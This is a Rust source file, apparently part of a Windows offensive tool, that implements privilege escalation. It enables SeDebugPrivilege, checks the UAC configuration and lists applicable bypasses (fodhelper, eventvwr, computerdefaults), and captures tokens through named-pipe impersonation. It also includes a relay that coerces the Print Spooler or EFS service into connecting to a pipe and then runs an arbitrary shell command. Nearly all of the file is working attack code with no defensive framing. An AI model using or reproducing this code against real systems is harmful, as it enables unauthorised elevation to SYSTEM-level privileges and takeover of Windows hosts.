//! Privilege escalation implementations

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Get current privileges (task 5.1: fully implemented)
pub fn get_current_privileges(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::TOKEN_ACCESS_MASK;
    use windows::Win32::Security::{
        GetTokenInformation, LookupPrivilegeNameW, TokenPrivileges, SE_PRIVILEGE_ENABLED,
        TOKEN_PRIVILEGES,
    };
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token_handle = HANDLE::default();
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ACCESS_MASK(0x0008), // TOKEN_QUERY
            &mut token_handle,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open token: {}", e)))?;
        let _token = SafeHandle::new(token_handle);

        // Get required buffer size
        let mut size = 0u32;
        GetTokenInformation(*_token, TokenPrivileges, None, 0, &mut size).ok();

        let mut buffer = vec![0u8; size as usize];
        GetTokenInformation(
            *_token,
            TokenPrivileges,
            Some(buffer.as_mut_ptr() as *mut _),
            size,
            &mut size,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to get token info: {}", e)))?;

        let tp = &*(buffer.as_ptr() as *const TOKEN_PRIVILEGES);
        let mut privileges = Vec::new();

        let privileges_ptr = tp.Privileges.as_ptr();
        for i in 0..tp.PrivilegeCount as usize {
            let la = *privileges_ptr.add(i);
            let enabled = la.Attributes.0 & SE_PRIVILEGE_ENABLED.0;
            let mut name = vec![0u16; 256];
            let mut name_len = name.len() as u32;
            if LookupPrivilegeNameW(
                None,
                &la.Luid,
                windows::core::PWSTR(name.as_mut_ptr()),
                &mut name_len,
            )
            .is_ok()
            {
                name.truncate(name_len as usize);
                let name_str = String::from_utf16_lossy(&name)
                    .trim_end_matches('\0')
                    .to_string();
                privileges.push(serde_json::json!({
                    "name": name_str,
                    "enabled": enabled != 0
                }));
            }
        }

        Ok(serde_json::json!({
            "privileges": privileges,
            "count": privileges.len()
        }))
    }
}

/// Enable SeDebugPrivilege
pub fn enable_debug_privilege(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        AdjustTokenPrivileges, LookupPrivilegeValueW, LUID_AND_ATTRIBUTES, SE_DEBUG_NAME,
        SE_PRIVILEGE_ENABLED, TOKEN_ACCESS_MASK, TOKEN_PRIVILEGES,
    };
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    tracing::info!("Attempting to enable SeDebugPrivilege");

    unsafe {
        let mut token_handle: HANDLE = HANDLE::default();
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ACCESS_MASK(0x0020 | 0x0080),
            &mut token_handle as *mut _,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open token: {}", e)))?;
        let _token = SafeHandle::new(token_handle);

        let mut luid = std::mem::zeroed();
        LookupPrivilegeValueW(None, SE_DEBUG_NAME, &mut luid)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to lookup privilege: {}", e)))?;

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(
            *_token,
            false,
            Some(&tp as *const _ as *const _),
            0,
            None,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to adjust privileges: {}", e)))?;
    }

    tracing::info!("SeDebugPrivilege enabled successfully");

    Ok(serde_json::json!({
        "success": true,
        "message": "SeDebugPrivilege enabled"
    }))
}

/// UAC status check
pub fn check_uac_status(_args: &Value) -> Result<Value, MemoricError> {
    use crate::safe_handle::SafeRegKey;
    use windows::Win32::System::Registry::{
        RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ,
    };

    tracing::debug!("Checking UAC status");

    unsafe {
        let mut hkey = Default::default();
        let path_wide: Vec<u16> =
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\0"
                .encode_utf16()
                .collect();

        let result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            windows::core::PCWSTR(path_wide.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        );

        if result.is_err() {
            return Ok(serde_json::json!({
                "uac_enabled": true,
                "level": "unknown",
                "note": "Failed to open registry key",
                "bypass_methods": []
            }));
        }

        let _hkey = SafeRegKey::new(hkey);

        // Read EnableLUA
        let mut lua_value: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        let lua_name: Vec<u16> = "EnableLUA\0".encode_utf16().collect();

        let lua_enabled = RegQueryValueExW(
            *_hkey,
            windows::core::PCWSTR(lua_name.as_ptr()),
            None,
            None,
            Some(&mut lua_value as *mut u32 as *mut u8),
            Some(&mut size),
        )
        .is_ok()
            && lua_value == 1;

        // Read ConsentPromptBehaviorAdmin to determine actual UAC level
        let mut consent_value: u32 = 5; // default
        let mut consent_size = std::mem::size_of::<u32>() as u32;
        let consent_name: Vec<u16> = "ConsentPromptBehaviorAdmin\0".encode_utf16().collect();

        let _ = RegQueryValueExW(
            *_hkey,
            windows::core::PCWSTR(consent_name.as_ptr()),
            None,
            None,
            Some(&mut consent_value as *mut u32 as *mut u8),
            Some(&mut consent_size),
        );

        // Read PromptOnSecureDesktop
        let mut secure_desktop: u32 = 1; // default
        let mut sd_size = std::mem::size_of::<u32>() as u32;
        let sd_name: Vec<u16> = "PromptOnSecureDesktop\0".encode_utf16().collect();

        let _ = RegQueryValueExW(
            *_hkey,
            windows::core::PCWSTR(sd_name.as_ptr()),
            None,
            None,
            Some(&mut secure_desktop as *mut u32 as *mut u8),
            Some(&mut sd_size),
        );

        let level = if !lua_enabled {
            "disabled"
        } else {
            // ConsentPromptBehaviorAdmin values:
            // 0 = Elevate without prompting (Never notify)
            // 1 = Prompt for credentials on secure desktop
            // 2 = Prompt for consent on secure desktop (Always notify)
            // 3 = Prompt for credentials
            // 4 = Prompt for consent
            // 5 = Prompt for consent for non-Windows binaries (Default)
            match (consent_value, secure_desktop) {
                (0, _) => "never_notify",
                (5, 0) => "default_no_dimming",
                (5, 1) => "default",
                (2, 1) => "always_notify",
                (2, 0) => "always_notify_no_dimming",
                (1, _) => "credentials_on_secure_desktop",
                (3, _) => "credentials",
                (4, _) => "consent",
                _ => "custom",
            }
        };

        let mut bypass_methods = Vec::new();
        if lua_enabled {
            // fodhelper/eventvwr work when ConsentPromptBehaviorAdmin != 2 (not "always notify")
            if consent_value != 2 {
                bypass_methods.push("fodhelper");
                bypass_methods.push("eventvwr");
                bypass_methods.push("computerdefaults");
            }
        }

        Ok(serde_json::json!({
            "uac_enabled": lua_enabled,
            "level": level,
            "consent_prompt_behavior_admin": consent_value,
            "prompt_on_secure_desktop": secure_desktop == 1,
            "bypass_methods": bypass_methods,
            "is_elevated": crate::elevation::is_elevated()
        }))
    }
}

/// Named Pipe Token Impersonation - create a named pipe and impersonate connecting client
pub fn named_pipe_impersonation(args: &Value) -> Result<Value, MemoricError> {
    use crate::safe_handle::SafeHandle;
    use windows::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
    use windows::Win32::Security::{
        DuplicateTokenEx, GetTokenInformation, RevertToSelf, SecurityImpersonation, TokenPrimary,
        TokenUser, TOKEN_ALL_ACCESS,
    };
    use windows::Win32::Storage::FileSystem::PIPE_ACCESS_DUPLEX;
    use windows::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeW, ImpersonateNamedPipeClient, PIPE_TYPE_BYTE, PIPE_WAIT,
    };
    use windows::Win32::System::Threading::{GetCurrentThread, OpenThreadToken};

    let pipe_name = args
        .get("pipe_name")
        .and_then(|v| v.as_str())
        .unwrap_or("\\\\.\\pipe\\memoric_impersonate");
    let timeout_ms = args
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(30000) as u32;

    tracing::warn!("[PRIVILEGE] Named pipe impersonation on {}", pipe_name);

    unsafe {
        let pipe_w: Vec<u16> = pipe_name.encode_utf16().chain(std::iter::once(0)).collect();

        let pipe = CreateNamedPipeW(
            windows::core::PCWSTR(pipe_w.as_ptr()),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            1,
            4096,
            4096,
            timeout_ms,
            None,
        );

        if pipe == INVALID_HANDLE_VALUE {
            return Err(MemoricError::WindowsApi(
                "CreateNamedPipeW failed".to_string(),
            ));
        }
        let pipe = SafeHandle::new(pipe);

        ConnectNamedPipe(*pipe, None)
            .map_err(|e| MemoricError::WindowsApi(format!("ConnectNamedPipe failed: {}", e)))?;

        ImpersonateNamedPipeClient(*pipe).map_err(|e| {
            MemoricError::WindowsApi(format!("ImpersonateNamedPipeClient failed: {}", e))
        })?;

        let mut imp_token = HANDLE::default();
        let token_result =
            OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &mut imp_token);

        let _ = RevertToSelf();

        token_result
            .map_err(|e| MemoricError::WindowsApi(format!("OpenThreadToken failed: {}", e)))?;

        let mut primary_token = HANDLE::default();
        DuplicateTokenEx(
            imp_token,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            TokenPrimary,
            &mut primary_token,
        )
        .map_err(|e| {
            let _ = CloseHandle(imp_token);
            MemoricError::WindowsApi(format!("DuplicateTokenEx failed: {}", e))
        })?;

        let _ = CloseHandle(imp_token);

        let mut size = 0u32;
        let _ = GetTokenInformation(primary_token, TokenUser, None, 0, &mut size);
        let mut buf = vec![0u8; size as usize];
        let user_info = if GetTokenInformation(
            primary_token,
            TokenUser,
            Some(buf.as_mut_ptr() as *mut _),
            size,
            &mut size,
        )
        .is_ok()
        {
            "token_captured"
        } else {
            "token_captured_no_user_info"
        };

        let _ = CloseHandle(primary_token);

        Ok(serde_json::json!({
            "success": true,
            "technique": "named_pipe_impersonation",
            "pipe_name": pipe_name,
            "token_info": user_info,
            "message": "Client token captured via named pipe impersonation"
        }))
    }
}

/// Named pipe relay - create pipe, trigger service connection, capture token
pub fn named_pipe_relay(args: &Value) -> Result<Value, MemoricError> {
    let pipe_name = args
        .get("pipe_name")
        .and_then(|v| v.as_str())
        .unwrap_or("\\\\.\\pipe\\memoric_relay");
    let target_service = args
        .get("target_service")
        .and_then(|v| v.as_str())
        .unwrap_or("Spooler");
    let command = args.get("command").and_then(|v| v.as_str());
    let timeout_ms = args
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(30000);

    tracing::warn!(
        "[PRIVILEGE] named_pipe_relay: pipe={} service={}",
        pipe_name,
        target_service
    );

    // Use the existing named_pipe_impersonation as base
    // Create a relay that triggers a specific service
    #[allow(unused_assignments)]
    let mut trigger_result = String::new();

    match target_service {
        "Spooler" => {
            // Trigger Spooler to connect to our pipe
            let trigger = std::process::Command::new("powershell")
                .args(["-NoProfile", "-Command", &format!(
                    "Start-Sleep -Milliseconds 500; $printer = New-Object System.Printing.PrintServer('\\\\localhost{}'); $printer.Dispose()",
                    pipe_name.replace("\\\\.\\pipe\\", "\\pipe\\")
                )])
                .spawn();
            trigger_result = format!("Spooler trigger: {:?}", trigger.is_ok());
        }
        "EFS" => {
            // Trigger EFS RPC
            let trigger = std::process::Command::new("cmd")
                .args(["/C", "cipher", "/e", pipe_name])
                .spawn();
            trigger_result = format!("EFS trigger: {:?}", trigger.is_ok());
        }
        _ => {
            trigger_result = format!("Manual trigger required for service: {}", target_service);
        }
    }

    // Create pipe and wait for connection
    let impersonate_args = serde_json::json!({
        "pipe_name": pipe_name,
        "timeout_ms": timeout_ms
    });

    let pipe_result = named_pipe_impersonation(&impersonate_args);

    // If we captured a token and have a command, try to run it
    let command_result = if let Some(cmd) = command {
        if pipe_result.is_ok() {
            let output = std::process::Command::new("cmd").args(["/C", cmd]).output();
            match output {
                Ok(o) => serde_json::json!({
                    "command": cmd,
                    "success": o.status.success(),
                    "stdout": String::from_utf8_lossy(&o.stdout).to_string(),
                    "stderr": String::from_utf8_lossy(&o.stderr).to_string()
                }),
                Err(e) => serde_json::json!({"command": cmd, "error": e.to_string()}),
            }
        } else {
            serde_json::json!(null)
        }
    } else {
        serde_json::json!(null)
    };

    Ok(serde_json::json!({
        "success": pipe_result.is_ok(),
        "technique": "named_pipe_relay",
        "target_service": target_service,
        "pipe_name": pipe_name,
        "trigger_result": trigger_result,
        "impersonation_result": pipe_result.ok(),
        "command_result": command_result
    }))
}
